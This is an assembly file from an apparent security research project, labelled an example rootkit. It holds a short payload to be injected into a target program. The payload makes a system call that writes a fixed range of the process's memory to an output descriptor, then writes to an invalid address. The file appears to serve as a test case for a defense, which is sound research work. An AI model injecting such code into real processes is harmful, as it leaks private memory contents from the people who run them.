/*===- injected.S - Example Rootkit =---------------------------------------===
 * 
 *                        Example Virtual Ghost Rootkit
 *
 * This file was developed by the LLVM research group and is distributed under
 * the University of Illinois Open Source License. See LICENSE.TXT for details.
 * 
 *===----------------------------------------------------------------------===
 *
 * This file provides the assembly code that is injected into the target
 * program.
 *
 *===----------------------------------------------------------------------===
 */

#if 0
#define TARGET 0x651000 
#define SIZE 0x1af000
#define FD 0x1
#else
#define TARGET 0x425860
#define SIZE 0xc
#define FD 0x1
#endif

.global badcode

.global endcode

.data

badcode:
  /*
   * Call the write system call.
   */
  movq $4, %rax
  movq $FD, %rdi
  movq $TARGET, %rsi
  movq $SIZE, %rdx
  syscall
  movq $0x0, 0xfed
endcode:

